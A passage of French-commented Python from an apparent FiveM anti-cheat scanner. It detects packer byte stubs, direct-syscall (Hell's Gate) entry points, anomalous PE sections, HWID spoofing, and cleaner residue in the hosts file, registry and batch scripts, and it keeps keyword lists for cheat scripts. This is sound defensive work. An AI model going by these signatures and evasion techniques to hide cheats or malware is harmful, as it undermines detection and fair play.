        if pe_off + 40 > len(header):
            return None

        magic = int.from_bytes(header[pe_off + 24: pe_off + 26], 'little')
        ep_rva = int.from_bytes(header[pe_off + 40: pe_off + 44], 'little')

        # Trouver l'offset fichier du EP via la table de sections
        opt_size = int.from_bytes(header[pe_off + 20: pe_off + 22], 'little')
        num_sec  = int.from_bytes(header[pe_off + 6: pe_off + 8], 'little')
        sec_off  = pe_off + 24 + opt_size

        ep_file_off = None
        for i in range(num_sec):
            s = sec_off + i * 40
            if s + 40 > len(header):
                break
            v_addr   = int.from_bytes(header[s + 12: s + 16], 'little')
            v_size   = int.from_bytes(header[s + 8:  s + 12], 'little')
            raw_off  = int.from_bytes(header[s + 20: s + 24], 'little')
            raw_size = int.from_bytes(header[s + 16: s + 20], 'little')
            if v_addr <= ep_rva < v_addr + max(v_size, raw_size):
                ep_file_off = raw_off + (ep_rva - v_addr)
                break

        if ep_file_off is None:
            return None

        with open(file_path, "rb") as f:
            f.seek(ep_file_off)
            ep_bytes = f.read(64)

        # Chercher le stub (court = 14 octets + long = 33 octets)
        if ep_bytes[:len(_PACKER_STUB_LONG)] == _PACKER_STUB_LONG:
            stub_match = "complet (33 octets)"
        elif ep_bytes[:14].startswith(b"\xe8\x82\x01\x00\x00\x41\x52\x49"):
            stub_match = "partiel (8 octets)"
        else:
            return None

        return {
            "is_cheat": True,
            "severity": "CRITICAL",
            "reason": (
                f"Stub Packer Custom détecté ({stub_match}) dans '{os.path.basename(file_path)}' — "
                f"Pattern identique aux cheats FiveM SPOOFER/CHEAT1 (Trojan:Win32/Wacatac.B!ml / Ravartar)."
            )
        }
    except Exception:
        pass
    return None


def _check_pe_direct_syscall(file_path: str) -> dict | None:
    """
    Détecte l'instruction syscall directe (opcode 0F 05) au point d'entrée.
    Technique Hell's Gate / SysWhispers — contourne les hooks userland des anti-cheat.
    Découvert dans CHEAT2 (realboss.v4) lors de l'analyse VM (2026-08-03).
    """
    try:
        if not os.path.isfile(file_path):
            return None
        if is_trusted_system_or_signed(file_path):
            return None
        fsize = os.path.getsize(file_path)
        if fsize < 4096:
            return None

        with open(file_path, "rb") as f:
            header = f.read(4096)

        if not header.startswith(b'MZ'):
            return None

        pe_off  = int.from_bytes(header[0x3C:0x40], 'little')
        if pe_off + 40 > len(header):
            return None

        ep_rva   = int.from_bytes(header[pe_off + 40: pe_off + 44], 'little')
        opt_size = int.from_bytes(header[pe_off + 20: pe_off + 22], 'little')
        num_sec  = int.from_bytes(header[pe_off + 6:  pe_off + 8],  'little')
        sec_off  = pe_off + 24 + opt_size

        ep_file_off = None
        for i in range(num_sec):
            s = sec_off + i * 40
            if s + 40 > len(header):
                break
            v_addr   = int.from_bytes(header[s + 12: s + 16], 'little')
            v_size   = int.from_bytes(header[s + 8:  s + 12], 'little')
            raw_off  = int.from_bytes(header[s + 20: s + 24], 'little')
            raw_size = int.from_bytes(header[s + 16: s + 20], 'little')
            if v_addr <= ep_rva < v_addr + max(v_size, raw_size):
                ep_file_off = raw_off + (ep_rva - v_addr)
                break

        if ep_file_off is None:
            return None

        with open(file_path, "rb") as f:
            f.seek(ep_file_off)
            ep_bytes = f.read(96)  # 96 premiers octets du EP

        if b"\x0f\x05" in ep_bytes:  # Opcode SYSCALL
            # Vérifier aussi le pattern push r10/pushfq/movabs r10 (Hell's Gate exact)
            has_hells_gate = ep_bytes[:2] in (b"\x41\x52", b"\x9c")  # push r10 ou pushfq
            pattern = "Hell's Gate/SysWhispers" if has_hells_gate else "syscall direct"
            return {
                "is_cheat": True,
                "severity": "CRITICAL",
                "reason": (
                    f"Syscall direct (opcode 0F 05) détecté au EP de '{os.path.basename(file_path)}' — "
                    f"Technique {pattern} : contourne les hooks userland anti-cheat (BattlEye/EAC). "
                    f"Pattern identique à CHEAT2 (realboss.v4 — Trojan:Win32/Kepavll)."
                )
            }
    except Exception:
        pass
    return None


def _check_pe_sections_anomaly(file_path: str) -> dict | None:
    """
    Détecte les noms de sections PE anormaux (scramblés, non-ASCII, noms de packer custom).
    Version contextuelle : .fptable est légitime dans les binaries Chromium/CEF signés.
    """
    SCRAMBLED_SECTIONS = {".3p+", ".t;-", ".fptable", ")d<"}  # CHEAT2 (realboss.v4)
    PACKER_SECTIONS   = {".arch", ".sdata", ".ddata", ".reloc2", ".reloc3", ".reloc4",
                         ".reloc5", ".reloc6", ".xdata", ".srdata", ".edata", ".idata"}  # SPOOFER/CHEAT1

    CEF_LEGIT_PATHS = (
        "discord", "chromium", "chrome", "edge", "electron", "cef",
        "fivem.app", "steam", "epic games", "medal",
        "windowsapps", "program files",
    )

    try:
        if not os.path.isfile(file_path):
            return None
        if is_trusted_system_or_signed(file_path):
            return None
        fsize = os.path.getsize(file_path)
        if fsize < 1024:
            return None

        with open(file_path, "rb") as f:
            header = f.read(4096)

        if not header.startswith(b'MZ'):
            return None

        pe_off   = int.from_bytes(header[0x3C:0x40], 'little')
        if pe_off + 24 > len(header):
            return None
        num_sec  = int.from_bytes(header[pe_off + 6:  pe_off + 8],  'little')
        opt_size = int.from_bytes(header[pe_off + 20: pe_off + 22], 'little')
        ep_rva   = int.from_bytes(header[pe_off + 40: pe_off + 44], 'little')
        sec_off  = pe_off + 24 + opt_size

        scrambled_found = []
        packer_found    = []
        ep_not_in_text  = False
        ep_section_name = ""
        non_ascii_found = []

        for i in range(num_sec):
            s = sec_off + i * 40
            if s + 40 > len(header):
                break
            sec_data = header[s: s + 40]
            raw_name = sec_data[:8].rstrip(b'\x00')
            sec_name = raw_name.decode('ascii', errors='replace').lower().strip()
            v_addr   = int.from_bytes(sec_data[12:16], 'little')
            v_size   = int.from_bytes(sec_data[8:12],  'little')
            raw_size = int.from_bytes(sec_data[16:20], 'little')

            if any(c not in range(32, 127) for c in raw_name if c != 0):
                non_ascii_found.append(repr(raw_name))

            sec_name_clean = sec_name.strip('\x00').strip()
            if sec_name_clean in SCRAMBLED_SECTIONS:
                scrambled_found.append(sec_name_clean)
            elif sec_name_clean in PACKER_SECTIONS:
                packer_found.append(sec_name_clean)

            if v_addr <= ep_rva < v_addr + max(v_size, raw_size):
                ep_section_name = sec_name_clean
                if sec_name_clean not in (".text", ".code"):
                    ep_not_in_text = True

        file_lower = file_path.lower()
        is_cef_context = any(p in file_lower for p in CEF_LEGIT_PATHS)
        is_fptable_only = scrambled_found == [".fptable"] and not non_ascii_found and not packer_found and not ep_not_in_text

        reasons = []
        score   = 0

        if scrambled_found:
            if is_fptable_only and is_cef_context:
                reasons.append(f"Section .fptable (binaire CEF/Chromium contextuel — analyse réduite)")
                score += 15
            elif is_fptable_only:
                reasons.append(f"Sections scramblées : {', '.join(scrambled_found)} (CHEAT2/realboss pattern)")
                score += 50
            else:
                reasons.append(f"Sections scramblées : {', '.join(scrambled_found)} (CHEAT2/realboss pattern)")
                score += 90
        if non_ascii_found:
            reasons.append(f"Sections non-ASCII : {', '.join(non_ascii_found[:3])}")
            score += 70
        if ep_not_in_text and ep_section_name:
            reasons.append(f"EP dans section '{ep_section_name}' (hors .text) — packer custom")
            score += 65
        if len(packer_found) >= 2:
            if is_cef_context:
                reasons.append(f"Sections packer ({', '.join(packer_found)}) — contexte CEF légitime probable")
                score += 10
            else:
                reasons.append(f"Sections packer custom : {', '.join(packer_found)} (SPOOFER/CHEAT1 pattern)")
                score += max(40, len(packer_found) * 12)

        if score >= 60 and reasons:
            return {
                "is_cheat": True,
                "severity": "CRITICAL" if score >= 80 else "HIGH",
                "reason": (
                    f"Sections PE anormales dans '{os.path.basename(file_path)}' (score={score}) : "
                    f"{' | '.join(reasons)}"
                )
            }
    except Exception:
        pass
    return None


def scan_uuid_config_files(progress_callback=None, pct=84):
    """
    Détecte les fichiers de licence UUID (36 chars) à côté d'un exe.
    Découvert en VM : CHEAT2 renomme dynamiquement '.config' en '9rppbt41ri.config'
    → on cherche TOUT fichier de 32-40 octets contenant un UUID valide.
    """
    if progress_callback:
        progress_callback("Scan Config UUID", pct, "Recherche de fichiers de licence UUID (cheat binding)...")

    traces = []
    uuid_re = re.compile(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$')

    user_profile = os.environ.get("USERPROFILE", "")
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    temp_dir = os.environ.get("TEMP", "")

    search_dirs = [
        os.path.join(user_profile, "Desktop"),
        os.path.join(user_profile, "Downloads"),
        os.path.join(user_profile, "Documents"),
        temp_dir,
        os.path.join(local_appdata, "Temp"),
    ]

    for base_dir in search_dirs:
        if not base_dir or not os.path.isdir(base_dir):
            continue
        try:
            for root, dirs, files in os.walk(base_dir):
                # Limiter la profondeur à 3 niveaux
                depth = root.replace(base_dir, "").count(os.sep)
                if depth >= 3:
                    dirs.clear()
                    continue

                # Ignorer les dossiers serveur FiveM / txAdmin et projets dev connus
                root_lower = root.lower()
                if any(kw in root_lower for kw in ["\\server fivem\\", "\\txadmin\\", "\\fxserver\\", "\\node_modules\\", "\\.git\\"]):
                    continue

                # Y a-t-il un .exe dans ce dossier ?
                has_exe = any(f.lower().endswith(".exe") for f in files)

                for file in files:
                    file_lower = file.lower()
                    if file_lower in ["server-monitor-token.key", "txadmin.key", "package.json", "tsconfig.json"]:
                        continue

                    fpath = os.path.join(root, file)
                    try:
                        fsize = os.path.getsize(fpath)
                        # Fichier de 32-50 octets (juste la taille d'un UUID ± BOM/newline)
                        if not (32 <= fsize <= 50):
                            continue
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f_:
                            content = f_.read().strip()
                        if uuid_re.match(content):
                            severity = "CRITICAL" if has_exe else "HIGH"
                            traces.append({
                                "file": file,
                                "path": fpath,
                                "uuid": content,
                                "has_exe_nearby": has_exe,
                                "severity": severity,
                                "description": (
                                    f"Fichier de licence UUID détecté : '{file}' = {content} "
                                    f"({'exe trouvé dans le même dossier' if has_exe else 'standalone'}). "
                                    f"Pattern CHEAT2 (realboss.v4) : le loader renomme ce fichier dynamiquement."
                                )
                            })
                    except Exception:
                        continue
        except (PermissionError, OSError):
            pass

    if progress_callback:
        progress_callback("Scan Config UUID", pct + 1, f"{len(traces)} fichier(s) de licence UUID trouvé(s)")

    return traces


def scan_eventlog_new_services(progress_callback=None, pct=85):
    """
    Analyse le journal d'événements Windows (System.evtx) pour détecter
    les EventID 7045 (nouveau service créé) avec des noms suspects.
    Les cheats drivers créent souvent un service lors du chargement.
    """
    if progress_callback:
        progress_callback("EventLog Services", pct, "Analyse des EventID 7045 (nouveaux services créés)...")

    traces = []
    try:
        # Utiliser wevtutil pour lire les EventID 7045 des 48 dernières heures
        ps_cmd = (
            "Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 50 -ErrorAction SilentlyContinue "
            "| Select-Object TimeCreated,"
            "@{N='ServiceName';E={$_.Properties[0].Value}},"
            "@{N='ServiceFile';E={$_.Properties[1].Value}} "
            "| ConvertTo-Json -Compress"
        )
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
            capture_output=True, text=True, encoding="utf-8", errors="replace",
            timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
        )
        if res.returncode != 0 or not res.stdout.strip():
            return traces

        import json as _json
        try:
            data = _json.loads(res.stdout.strip())
        except Exception:
            return traces
        if isinstance(data, dict):
            data = [data]

        # Services Windows et Antivirus légitimes connus (whitelist)
        LEGIT_SERVICE_PREFIXES = (
            "windefend", "mpssvc", "bits", "wuauserv", "trustedinstaller",
            "spooler", "cryptsvc", "eventlog", "wsearch", "msiserver",
            "lanmanserver", "lanmanworkstation", "netlogon", "seclogon",
            "schedule", "themes", "dnscache", "nsi", "iphlpsvc", "dhcp",
            "docsvc", "winmgmt", "wmi", "rpcss", "lmhosts",
            "easyanticheat", "mpksl", "microsoft defender",
            "nla", "dusm", "dot3svc", "wlidsvc", "tokenbroker",
            "camsvc", "cbdhsvc", "lfsvc", "mapsbroker", "perfhost",
            "wisvc", "wwansvc", "wbengine", "vds", "vss",
            "malwarebytes", "mbamservice", "mcpr", "mcafee",
            "eaanticheat", "ea anticheat", "eaanticheatservice",
            "hwinfo", "driver booster", "iobit"
        )

        LEGIT_SERVICE_FILE_PATHS = (
            "\\microsoft\\windows defender\\",
            "\\microsoft\\windows\\",
            "\\program files\\easyanticheat\\",
            "\\program files (x86)\\easyanticheat\\",
            "\\programdata\\malwarebytes\\",
            "\\program files\\malwarebytes\\",
            "\\program files\\ea\\",
            "\\program files (x86)\\iobit\\",
            "hwinfo",
            "\\windows\\system32\\",
            "\\windows\\syswow64\\",
            "\\windows\\winsxs\\",
            "\\windows\\servicing\\",
        )

        for item in data:
            svc_name = (item.get("ServiceName") or "").strip()
            svc_file = (item.get("ServiceFile") or "").strip()
            time_str = str(item.get("TimeCreated") or "")

            if not svc_name:
                continue

            svc_lower = svc_name.lower()
            # Ignorer les services légitimes connus
            if any(svc_lower.startswith(p) for p in LEGIT_SERVICE_PREFIXES):
                continue

            # Fichier service dans un chemin suspect
            svc_file_lower = svc_file.lower()
            is_known_legit_path = any(p in svc_file_lower for p in LEGIT_SERVICE_FILE_PATHS)
            is_suspicious_path = not is_known_legit_path and any(kw in svc_file_lower for kw in [
                "\\temp\\", "\\downloads\\", "\\appdata\\local\\temp",
                "\\users\\public\\", "\\programdata\\"
            ])
            is_cheat_name = any(kw in svc_lower for kw in SUSPICIOUS_KEYWORDS + ["dumpdrv", "byp"])

            if is_suspicious_path or is_cheat_name:
                traces.append({
                    "service_name": svc_name,
                    "service_file": svc_file,
                    "time_created": time_str,
                    "severity": "CRITICAL",
                    "description": (
                        f"Nouveau service suspect créé (EventID 7045) : '{svc_name}' "
                        f"→ '{svc_file}' (créé le {time_str}). "
                        f"Indicateur fort de chargement de driver cheat."
                    )
                })
    except Exception:
        pass

    if progress_callback:
        progress_callback("EventLog Services", pct + 1, f"{len(traces)} service(s) suspect(s) détecté(s)")

    return traces


def scan_conhost_parent_suspicious(progress_callback=None, pct=86):
    """
    Détecte les processus conhost.exe dont le parent n'est pas légitime.
    Découvert en VM : CHEAT2 (subsystem CONSOLE) crée un conhost.exe enfant.
    Un conhost.exe dont le parent n'est pas cmd.exe/explorer.exe est suspect.
    """
    if progress_callback:
        progress_callback("Conhost Parent", pct, "Vérification de la hiérarchie conhost.exe...")

    traces = []
    if psutil is None:
        return traces

    LEGIT_CONHOST_PARENTS = {
        "cmd.exe", "explorer.exe", "wt.exe", "windowsterminal.exe",
        "powershell.exe", "pwsh.exe", "conhost.exe", "svchost.exe",
        "services.exe", "system", "anti-scan.exe", "antiscan.exe",
        "medalencoder.exe", "medal.exe", "obs64.exe", "obs32.exe",
        "devenv.exe", "msbuild.exe", "node.exe", "python.exe", "python3.exe",
        "npm.exe", "pip.exe", "code.exe", "git.exe", "bash.exe",
        "antigravity ide.exe", "language_server_windows_x64.exe",
        "pyrefly.exe", "ollama app.exe", "ollama.exe", "idea64.exe", "pycharm64.exe"
    }

    try:
        all_procs = {p.pid: p for p in psutil.process_iter(['pid', 'name', 'ppid'])}
        for proc in all_procs.values():
            try:
                if proc.info['name'] and proc.info['name'].lower() == 'conhost.exe':
                    ppid = proc.info.get('ppid')
                    if ppid and ppid in all_procs:
                        parent = all_procs[ppid]
                        parent_name = (parent.info.get('name') or "").lower()
                        if parent_name and parent_name not in LEGIT_CONHOST_PARENTS:
                            # Vérifier si le parent est un exe signé légitime
                            parent_exe = parent.exe() if parent else ""
                            parent_lower = parent_exe.lower() if parent_exe else ""
                            is_system = (
                                r"c:\windows\system32" in parent_lower or
                                r"c:\windows\syswow64" in parent_lower or
                                r"c:\program files" in parent_lower
                            )
                            if not is_system:
                                traces.append({
                                    "conhost_pid": proc.pid,
                                    "parent_name": parent_name,
                                    "parent_pid": ppid,
                                    "parent_exe": parent_exe,
                                    "severity": "HIGH",
                                    "description": (
                                        f"conhost.exe (PID:{proc.pid}) a pour parent '{parent_name}' "
                                        f"(PID:{ppid}, exe: {parent_exe}) — parent non-légitime. "
                                        f"Indicateur de loader cheat en mode CONSOLE (CHEAT2 pattern)."
                                    )
                                })
            except Exception:
                continue
    except Exception:
        pass

    return traces


def scan_hwid_crosscheck(progress_callback=None, pct=87):
    """
    Cross-check HWID : compare MachineGuid (registre) avec UUID WMI réel.
    Si divergence → probable HWID spoofing actif.
    Les cheats modifient MachineGuid, Disk\Enum, etc. (observé dans les rapports VM).
    """
    if progress_callback:
        progress_callback("HWID Cross-Check", pct, "Vérification cohérence HWID registre vs hardware WMI...")

    result = {
        "machine_guid_reg": None,
        "wmi_uuid": None,
        "disk_serial_reg": None,
        "wmi_disk_serial": None,
        "spoof_detected": False,
        "spoof_details": []
    }

    try:
        # 1. MachineGuid depuis le registre
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Cryptography"
            )
            machine_guid, _ = winreg.QueryValueEx(key, "MachineGuid")
            winreg.CloseKey(key)
            result["machine_guid_reg"] = machine_guid.strip()
        except Exception:
            pass

        # 2. UUID WMI (Win32_ComputerSystemProduct)
        try:
            res = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                 "(Get-CimInstance Win32_ComputerSystemProduct).UUID"],
                capture_output=True, text=True, encoding="utf-8", errors="replace",
                timeout=5, creationflags=subprocess.CREATE_NO_WINDOW
            )
            wmi_uuid = res.stdout.strip()
            if wmi_uuid and "error" not in wmi_uuid.lower():
                result["wmi_uuid"] = wmi_uuid
        except Exception:
            pass

        # 3. Numéro de série disque depuis registre Disk\Enum
        try:
            disk_key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Disk\Enum"
            )
            disk0_val, _ = winreg.QueryValueEx(disk_key, "0")
            winreg.CloseKey(disk_key)
            result["disk_serial_reg"] = disk0_val.strip()
        except Exception:
            pass

        # 4. Numéro de série disque depuis WMI (Win32_DiskDrive)
        try:
            res = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                 "(Get-CimInstance Win32_DiskDrive | Select -First 1).SerialNumber"],
                capture_output=True, text=True, encoding="utf-8", errors="replace",
                timeout=5, creationflags=subprocess.CREATE_NO_WINDOW
            )
            wmi_disk = res.stdout.strip()
            if wmi_disk and "error" not in wmi_disk.lower():
                result["wmi_disk_serial"] = wmi_disk
        except Exception:
            pass

        # Analyse des divergences
        # Note : MachineGuid et WMI UUID ne sont PAS les mêmes valeurs par défaut
        # mais si disk_serial_reg est all-zeros ou suspicieux, c'est un indicateur
        disk_reg = result.get("disk_serial_reg", "") or ""
        if disk_reg:
            # Valeurs de spoof connues : 0000, 00000000, UUID aléatoire minimal
            if re.match(r'^0+$', disk_reg.split("\\")[-1]):
                result["spoof_detected"] = True
                result["spoof_details"].append(
                    f"Disk\\Enum\\0 contient une valeur suspecte (zeros) : '{disk_reg[:60]}'"
                )

        # Vérifier si MachineGuid a été vidé ou mis à zéro
        mg = result.get("machine_guid_reg", "") or ""
        if mg and mg.lower() in (
            "00000000-0000-0000-0000-000000000000",
            "ffffffff-ffff-ffff-ffff-ffffffffffff"
        ):
            result["spoof_detected"] = True
            result["spoof_details"].append(
                f"MachineGuid spoofé (valeur nulle/max) : '{mg}'"
            )

    except Exception:
        pass

    return result


# ─────────────────────────────────────────────
# FORENSIQUE : DÉTECTION CLEANERS/SPOOFERS FIVEM (NitWitcleaner & similaires)
# Découvert via reverse engineering + analyse VM (dossier spoofer/).
# Conçu ANTI-FAUX-POSITIFS : chaque indicateur exige une signature forte
# (hosts/registre) OU une combinaison de signaux faibles (≥3 traces absentes).
# ─────────────────────────────────────────────
XBOXLIVE_DOMAINS = (
    "xboxlive.com",
    "user.auth.xboxlive.com",
    "presence-heartbeat.xboxlive.com",
)

FIVEM_AUTH_FILES = (
    "CitizenFX.ini",
    "steam_api64.dll",
    "profiles.dll",
    "caches.XML",
)

CLEANER_TRACE_KEYS = (
    (winreg.HKEY_CURRENT_USER, r"Software\WinRAR\ArcHistory"),
    (winreg.HKEY_CURRENT_USER, r"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView"),
    (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"),
    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"),
)


def _reg_key_exists(hive, path):
    try:
        k = winreg.OpenKey(hive, path)
        winreg.CloseKey(k)
        return True
    except Exception:
        return False


def scan_spoofer_cleaner(progress_callback=None, pct=90):
    """
    Détecte les effets résiduels d'un cleaner/spoofer FiveM de type NitWitcleaner.
    Le malware nettoie ses scripts mais JAMAIS ses effets (hosts, registre, FiveM)
    → détection "après coup" fiable. Seuils volontairement stricts pour éviter
    les faux positifs :
      - hosts xboxlive : ≥2 occurrences OU ≥2 domaines distincts
      - MSLicensing    : les 2 sous-clés absentes ET la clé parente présente
      - FiveM          : uniquement si FiveM est installé ET ≥3 fichiers manquants
      - batch %TEMP%   : pattern de dossier <hex>.tmp>\\<hex>.tmp> + contenu + <24h
      - traces         : ≥3 clés de traces absentes (signaux faibles combinés)
    """
    if progress_callback:
        progress_callback("Cleaner/Spoofer FiveM", pct, "Vérification des effets résiduels (hosts, licence, FiveM, traces)...")

    findings = []
    score = 0

    # ── 1. Fichier hosts pollué avec domaines Xbox Live (signature forte) ──
    hosts_path = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "System32", "drivers", "etc", "hosts")
    try:
        if os.path.isfile(hosts_path):
            with open(hosts_path, "r", encoding="utf-8", errors="ignore") as f:
                hosts_lower = f.read().lower()
            present_domains = [d for d in XBOXLIVE_DOMAINS if d in hosts_lower]
            total_entries = hosts_lower.count("xboxlive.com")
            if len(present_domains) >= 2 or total_entries >= 2:
                score += 60
                findings.append({
                    "rule": "hosts_xboxlive",
                    "severity": "CRITICAL",
                    "title": "Fichier hosts pollué (blocage Xbox Live)",
                    "detail": (f"Le fichier hosts contient {total_entries} entrée(s) bloquant "
                               f"Xbox Live ({', '.join(present_domains)}). Signature du cleaner "
                               f"NitWitcleaner (contournement de ban FiveM).")
                })
    except Exception:
        pass

    # ── 2. Licence MSLicensing supprimée (garde : clé parente doit exister) ──
    mslic_root = r"SOFTWARE\Microsoft\MSLicensing"
    if _reg_key_exists(winreg.HKEY_LOCAL_MACHINE, mslic_root):
        hwid_gone = not _reg_key_exists(winreg.HKEY_LOCAL_MACHINE, mslic_root + r"\HardwareID")
        store_gone = not _reg_key_exists(winreg.HKEY_LOCAL_MACHINE, mslic_root + r"\Store")
        if hwid_gone and store_gone:
            score += 50
            findings.append({
                "rule": "mslicensing_missing",
                "severity": "CRITICAL",
                "title": "Clés de licence Microsoft supprimées",
                "detail": ("HKLM\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID et \\Store sont absents "
                           "alors que la clé parente existe. Suppression typique d'un cleaner anti-ban "
                           "FiveM (reset licence Xbox).")
            })

    # ── 3. Fichiers d'authentification FiveM manquants (uniquement si FiveM installé) ──
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    fivem_app = os.path.join(local_appdata, "FiveM", "FiveM.app")
    if os.path.isdir(fivem_app):
        missing = [fn for fn in FIVEM_AUTH_FILES if not os.path.exists(os.path.join(fivem_app, fn))]
        if len(missing) >= 3:
            score += 45
            findings.append({
                "rule": "fivem_auth_missing",
                "severity": "HIGH",
                "title": "Fichiers d'authentification FiveM supprimés",
                "detail": (f"FiveM est installé mais {len(missing)} fichier(s) d'auth sont absents : "
                           f"{', '.join(missing)}. Réinitialisation typique de clean/ban.")
            })

    # ── 4. Script batch cleaner dans %TEMP%\<hex>.tmp\<hex>.tmp\ (fenêtre courte) ──
    temp_dir = os.environ.get("TEMP", "")
    try:
        if temp_dir and os.path.isdir(temp_dir):
            hex_tmp_re = re.compile(r'^[0-9A-Fa-f]{3,8}\.tmp$')
            now = time.time()
            try:
                top_dirs = os.listdir(temp_dir)
            except OSError:
                top_dirs = []
            for d1 in top_dirs:
                if not hex_tmp_re.match(d1):
                    continue
                lvl2 = os.path.join(temp_dir, d1)
                try:
                    sub_dirs = os.listdir(lvl2)
                except OSError:
                    continue
                for d2 in sub_dirs:
                    if not hex_tmp_re.match(d2):
                        continue
                    batch_dir = os.path.join(lvl2, d2)
                    try:
                        for fname in os.listdir(batch_dir):
                            if not fname.lower().endswith(".bat"):
                                continue
                            batch_path = os.path.join(batch_dir, fname)
                            try:
                                if now - os.path.getmtime(batch_path) > 24 * 3600:
                                    continue
                                with open(batch_path, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read(65536).lower()
                                has_kill = "taskkill" in content
                                has_reg = "reg delete" in content
                                has_fivem = "fivem" in content or "xboxlive" in content or "mslicensing" in content
                                if (has_kill and has_reg) or (has_fivem and has_reg):
                                    score += 40
                                    findings.append({
                                        "rule": "temp_cleaner_batch",
                                        "severity": "CRITICAL",
                                        "title": "Script batch cleaner détecté dans %TEMP%",
                                        "detail": (f"{fname} dans {batch_dir} (créé il y a < 24h) : contient "
                                                   f"taskkill + REG DELETE / FiveM. Pattern du loader NitWitcleaner.")
                                    })
                                    break
                            except Exception:
                                continue
                    except OSError:
                        continue
    except Exception:
        pass

    # ── 5. Nettoyage de traces anti-forensique (combinaison ≥4 clés absentes avec autre indice) ──
    missing_traces = [path for hive, path in CLEANER_TRACE_KEYS if not _reg_key_exists(hive, path)]
    if len(missing_traces) >= 4 and score > 0:
        score += 20
        findings.append({
            "rule": "trace_cleanup",
            "severity": "MEDIUM",
            "title": "Traces d'activité anormalement absentes",
            "detail": (f"{len(missing_traces)}/6 clés de traces système absentes "
                       f"({', '.join(p[-30:] for p in missing_traces[:3])}...). "
                       f"Nettoyage anti-forensique possible (signal faible, à corréler).")
        })

    if progress_callback:
        progress_callback("Cleaner/Spoofer FiveM", pct + 1,
                          f"{len(findings)} indicateur(s) de cleaner détecté(s) (score {score})")

    return {"score": score, "findings": findings}


def scan_fivem_lua_js_cheat_scripts(progress_callback=None, pct=88):
    """
    Scanne les répertoires FiveM (data/cache, cache/subprocess, data/nui, plugins)
    pour des scripts Lua/JS potentiellement liés à des cheats (menus, executors).
    Nitwit et autres menus modernes s'exécutent comme des scripts Lua injectés via executor.
    """
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    user_profile  = os.environ.get("USERPROFILE", "")
    appdata       = os.environ.get("APPDATA", "")

    # On ÉVITE le dossier cache racine et game-storage (30 Go d'assets GTA)
    # On ne cible que subprocess, nui et plugins (fichiers petits)
    fivem_dirs = [
        os.path.join(local_appdata, "FiveM", "FiveM.app", "data", "cache", "subprocess"),
        os.path.join(local_appdata, "FiveM", "FiveM.app", "data", "nui"),
        os.path.join(local_appdata, "FiveM", "FiveM.app", "plugins"),
    ]

    # Patterns de noms de fichiers suspects dans les dossiers FiveM
    SUSPICIOUS_SCRIPT_PATTERNS = [
        # Menu / executor names
        "nitwit", "quasar", "sapphire", "jaguar", "venom", "onyx", "ares",
        "vmenu", "vrp", "esx", "storm", "fluxus", "scripthook", "luaexec",
        "executor", "menu.lua", "cheat", "hack", "exploit", "inject",
        "aimbot", "wallhack", "esp", "noclip", "godmode",
    ]

    # Contenu Lua/JS suspect (lu dans le fichier)
    LUA_SUSPICIOUS_CONTENT = [
        "menu.add_checkbox", "menu.add_button", "menu.toggle",
        "Citizen.CreateThread", "TriggerServerEvent",
        "RegisterNetEvent", "AddEventHandler",
        "SetEntityInvincible", "SetPlayerInvisible", "SetPlayerInvincible",
        "GiveWeaponToPed", "SetPedArmour",
        "NetworkExplodeVehicle", "AddExplosion",
    ]

    JS_SUSPICIOUS_CONTENT = [
        "mp.game", " natives.", "require(",
        "mp.players.local", "mp.vehicles",
        "eval(", "Function(",
    ]

    suspects = []
    scanned = 0

    def _scan_dir_lua(d):
        nonlocal scanned
        if not os.path.isdir(d):
            return
        for root, dirs, files in os.walk(d):
            depth = root.lower().count(os.sep) - d.lower().count(os.sep)
            if depth > 3:
                dirs.clear()
                continue
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in (".lua", ".js", ".ts", ".jsx", ".tsx", ".json", ".cfg", ".txt", ".xml"):
                    continue
                full = os.path.join(root, fname)
                scanned += 1
                try:
                    if os.path.getsize(full) > 1 * 1024 * 1024:
                        continue
                    with open(full, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read(65536)
                    content_lower = content.lower()
                    name_lower = fname.lower()
                    reasons = []
                    severity = "LOW"

                    for pat in SUSPICIOUS_SCRIPT_PATTERNS:
                        if pat in name_lower:
                            reasons.append(f"Nom de fichier suspect: '{pat}'")
                            severity = "HIGH"
                            break

                    if ext in (".lua", ".cfg"):
                        for pat in LUA_SUSPICIOUS_CONTENT:
                            if pat.lower() in content_lower:
                                reasons.append(f"Contenu Lua suspect: '{pat}'")
                                if severity == "LOW":
                                    severity = "MEDIUM"

                    if ext in (".js", ".ts", ".jsx", ".tsx"):
                        for pat in JS_SUSPICIOUS_CONTENT:
                            if pat.lower() in content_lower:
                                reasons.append(f"Contenu JS suspect: '{pat}'")
                                if severity == "LOW":
                                    severity = "MEDIUM"

                    # Si le nom est dans un cache/subprocess ET contient du code suspect
                    if "subprocess" in root.lower() and ext in (".lua", ".js"):
                        reasons.append(f"Script exécutable trouvé dans cache/subprocess")
                        if severity == "LOW":
                            severity = "MEDIUM"

                    if reasons:
